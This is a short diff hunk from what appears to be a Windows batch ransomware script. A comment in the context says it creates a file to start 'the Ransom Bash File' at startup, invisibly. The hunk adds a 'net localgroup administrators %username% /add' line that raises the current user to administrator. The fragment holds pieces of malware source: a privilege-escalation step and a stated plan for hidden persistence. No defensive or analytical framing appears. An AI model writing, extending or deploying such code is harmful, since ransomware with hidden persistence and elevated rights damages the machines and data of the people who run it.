@@ -34,6 +34,7 @@ echo         did you want to verify
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 set /p web1= :  C:\users\%username%\
 set web="C:\users\%username%\%web1%"
+net localgroup administrators %username% /add
 
 ::Create A File To Start The Ransom Bash File At The Start Up, Invisibly::
 
